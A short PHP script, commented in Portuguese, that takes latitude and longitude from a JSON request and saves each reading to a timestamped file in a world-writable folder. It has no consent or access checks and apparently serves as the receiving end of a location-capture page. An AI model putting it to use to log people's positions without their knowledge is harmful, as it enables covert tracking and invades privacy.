<?php
// Cria a pasta location, se não existir
if (!file_exists('location')) mkdir('location', 0777, true);

$data = file_get_contents('php://input');
$decoded = json_decode($data, true);

if ($decoded) {
    $logData = [
        'Latitude' => $decoded['latitude'] ?? 'N/A',
        'Longitude' => $decoded['longitude'] ?? 'N/A',
        'Data e Hora' => date('Y-m-d H:i:s'),
    ];

    // Salva os dados em um arquivo na pasta location
    $filename = 'location/gps_' . date('Y-m-d_H-i-s') . '.txt';
    file_put_contents($filename, json_encode($logData, JSON_PRETTY_PRINT));
}
?>
